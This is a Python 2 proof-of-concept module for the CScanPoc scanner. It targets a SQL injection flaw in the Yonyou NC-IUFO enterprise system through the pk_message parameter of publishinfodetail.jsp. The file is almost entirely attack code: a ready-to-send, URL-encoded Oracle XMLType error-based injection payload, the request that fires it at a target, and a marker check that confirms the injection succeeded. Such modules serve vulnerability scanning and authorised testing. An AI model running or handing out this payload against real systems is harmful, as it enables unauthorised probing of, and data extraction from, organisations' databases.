# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time

class Vuln(ABVuln):
    vuln_id = 'Yonyou_0003' # 平台漏洞编号，留空
    name = '用友NC-IUFO系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-12-30'  # 漏洞公布时间
    desc = '''
        用友NC-IUFO系统 /epp/detail/publishinfodetail.jsp?pk_message= 通用SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '用友'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'dbb306c0-9224-4693-94ff-d1c15afbd35d'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            url = self.target
            url = url if url[-1] != '/' else url[:-1]
            payload = ("/epp/detail/publishinfodetail.jsp?pk_message=1002F410000000019JNX%27%20"
                       "AND%203814=(SELECT%20UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(99)||"
                       "CHR(122)||CHR(103)||CHR(113)||(SELECT%20(CASE%20WHEN%20(3814=3814)%20THEN"
                       "%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(113)||CHR(110)||CHR(111)||CHR(105)"
                       "||CHR(113)||CHR(62)))%20FROM%20DUAL)%20AND%20%27vdoA%27=%27vdoA")
            verify_url = url + payload

            req = requests.get(verify_url)
            content = req.content
            if req.status_code == 500 and 'qczgq1qnoiq' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
